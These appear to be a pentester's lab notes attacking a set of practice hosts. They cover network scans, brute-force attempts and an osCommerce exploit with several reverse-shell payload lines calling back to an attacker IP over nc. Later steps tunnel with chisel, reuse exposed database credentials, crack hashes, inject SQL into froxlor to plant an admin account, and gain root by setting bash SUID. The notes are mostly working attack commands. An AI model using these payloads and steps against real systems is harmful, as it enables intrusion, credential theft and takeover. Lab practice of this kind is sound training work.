```
nmap 192.168.240.220-227 192.168.240.250
```

.250
```
nmap 192.168.240.250
nmap -sT -A -p 5040,49664 192.168.240.250
sudo nmap -O 192.168.240.250 --osscan-guess
sudo nmap -sU --open -p 161 192.168.240.250

# only ports open (no snmp): 135,139,445,3389,5040,49664-49670
```

.220 - (Skylark Partner Portal)
```
nmap 192.168.240.220

# ports open: 80,135,139,445,5900(vnc),5985,47001(winrm),49664-49670
nmap -sT -A -p 80,5900,47001 192.168.240.220

# enumerate vnc, cannot connect
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p 5900 192.168.240.220
hydra -s 5900 -P /usr/share/seclists/Passwords/Default-Credentials/vnc-betterdefaultpasslist.txt -t 16 192.168.240.220 vnc
vncviewer 192.168.240.220::5901

# enumerate smb - we need a password to do anything
enum4linux 192.168.240.220
nmap -v -p 139,445 --script smb-os-discovery 192.168.240.220
smbclient -L 192.168.240.220
smbmap -H 192.168.240.220

# enumerate webserver
# cracking using the 10million will take way too long, smaller lists have no effect
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/seclists/Passwords/probable-v2-top1575.txt -s 80 -f 192.168.240.220 http-get /
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.240.220 
```

.221 (austin02.SKYLARK.com)
```
nmap 192.168.240.221
nmap -sT -A -p 80,443 192.168.240.221
nmap -p 1000-60000 192.168.240.221
# port 3387, 5504 open

# enumerate port 10000 (i don't think it's actually ndmp, but another rdp port)
nmap -n -sV --script "ndmp-fs-info or ndmp-version" -p 10000 192.168.240.221

# enumerate smb - we need a password to do anything
enum4linux 192.168.240.221
nmap -v -p 139,445 --script smb-os-discovery 192.168.240.221
smbclient -L 192.168.240.221
smbmap -H 192.168.240.221

# enumerate webserver
nikto -host 192.168.240.221 -port 80
whatweb http://192.168.240.221:80
gobuster dir -u http://192.168.240.221:80 -w /usr/share/wordlists/dirb/common.txt
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt --url http://192.168.240.221 --dont-scan /aspnet_client,/Aspnet_client,/Aspnet_Client,/aspnet_Client,/ASPNET_CLIENT
```

.222
```
nmap 192.168.213.222
sudo nmap -sU --open -p 161 192.168.213.222

# ports 135,139,445,2994(veritas-vis2),5985(wsman),47001(winrm),49664-49670

# enumerate smb - we need a password to do anything
enum4linux 192.168.213.222
nmap -v -p 139,445 --script smb-os-discovery 192.168.213.222
smbclient -L 192.168.213.222
smbmap -H 192.168.213.222
```

.223 (milan)
```
nmap 192.168.213.223
sudo nmap -sU --open -p 161 192.168.213.223

# 80,443 show up, but are closed, 161 open
# fastest nmap scan (-pN, -sT make it slower)
sudo nmap -p- -Pn 192.168.213.223 -sS -T 5 --verbose
nmap -sT -A -p 60001 192.168.213.223

# enumerate webserver at 60001
gobuster dir -u http://192.168.213.223:60001 -w /usr/share/wordlists/dirb/common.txt
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.213.223:60001

# find http://192.168.213.223:60001/docs/release_notes.pdf - # osCommerce 2.3.4.1
# find https://www.exploit-db.com/exploits/44374

# run to get shell on 443
python3 44374.py

# source for shells: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
# Does not work
my_shell_file = open("/home/kali/relia/shell.php")
shell_data = my_shell_file.read()

# bash -e does not work
payload += 'system("nc -e /bin/bash 192.168.45.160 443");'

# doesn't work, probably not using file descriptor 3
payload += '$sock=fsockopen("192.168.45.160",443);exec("/bin/sh -i <&3 >&3 2>&3");'

# This one works. (alternative if nc -e does not work)
payload += 'system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.160 443 >/tmp/f");'

nc -nvlp 443
```

.223 privesc
```
wget http://192.168.45.160/linpeas.sh -O linpeas.sh

# findings
# root is running an apache2 process
# writable /var/www/html/froxlor, also a github repo
# so there's an apache server running on 60002 (and 80?) that's running this froxlor thing, owned by root - we know what is running where because linpeas outputs apache configs
# users milan and sarah, milan is in the adm and sudo groups
# port 60002, 631, 3306, 22 are active on the box (see active ports section from linpeas)
# this command would show you what is on 60002 but we aren't root
netstat -ltnp | grep -w ':60002'
netstat -ltnp | grep -w ':80'
# find db creds
db=oscdb, user=oscuser, password=7NVLVTDGJ38HM2TQ
# local.txt is in /root

searchsploit -m 51263

chisel server --port 80 --reverse
sudo tcpdump -nvvvXi tun0 tcp port 8081
wget http://192.168.45.160/chisel -O chisel

# need to use port 80 because other ports seem to be blocked. we need to use a port that's open on the target machine
./chisel client 192.168.45.160:80 R:60002:0.0.0.0:60002

# try froxlor RCE exploit - https://github.com/mhaskar/CVE-2023-0315
wget https://raw.githubusercontent.com/mhaskar/CVE-2023-0315/main/froxlor-rce.py
python3 froxlor-rce.py http://127.0.0.1:60002 admin password 182.168.45.160 9999

# can't login. let's see if we can access the internal mysql server using previously found creds
# from target
./chisel client 192.168.45.160:80 R:3306:0.0.0.0:3306
# from kali - pw: 7NVLVTDGJ38HM2TQ
mysql -u oscuser -D oscdb -h 127.0.0.1 -p
select * from administrators;
# find a user (admin) and password hash
$P$DVNsEBdq7PQdr7GR65xbL0pas6caWx0 
hashid admin.md5.hash # phpass
hashcat --help | grep 'phpass' # mode 400
hashcat -m 400 admin.md5.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# we need to get into the froxlor DB instead of sscdb to get password hashes
/etc/mysql/my.cnf
/etc/mysql/mariadb.cnf 
/var/www/html/froxlor/.github
/var/www/html/froxlor/logs
/var/www/html/froxlor/admin_configfiles.php - says it has mysql password FROXLOR_MYSQL_PASSWORD

# turns out we can just use the same password of the oscdb user as root 
use froxlor;
select loginname, password from panel_admins;
select * from panel_customers;
$5$b50069d236c187f2$PIeKl3JO.NJ5X0hhtHjmJx9nDtImDP61/x4D8Rv/Gu/ 
hashid panel.hash # [+] SHA-256 Crypt 
hashcat --help | grep 'crypt' # 7400 | sha256crypt $5$, SHA256 (Unix)  
# not able to crack admin password
hashcat -m 7400 panel.hash /usr/share/wordlists/rockyou.txt
# able to crack - Christopher
hashcat -m 7400 flybike.hash /usr/share/wordlists/rockyou.txt

# need to use a different exploit, as the first one requires that you already have the admin creds
# use #4 from here: https://www.exploit-db.com/exploits/50502
# add the following to the db name in 'create database'
`;insert into panel_admins (loginname,password,customers_see_all,domains_see_all,caneditphpsettings,change_serversettings) values ('x','$5$ccd0bcdd9ab970b1$Hx/a0W8QHwTisNoa1lYCY4s3goJeh.YCQ3hWqH1ZUr8',1,1,1,1);--

# settings -> webserver -> webserver reload command as administrator, then reload configuration files
# the shell back doesn't work probably because i'm already using the ports 80,, 443
# changing bash to suid binary then executing bash -p is another great way to get root shell  
nc -e bash 192.168.45.160 443
chmod u+s /usr/bin/bash
bash -p
```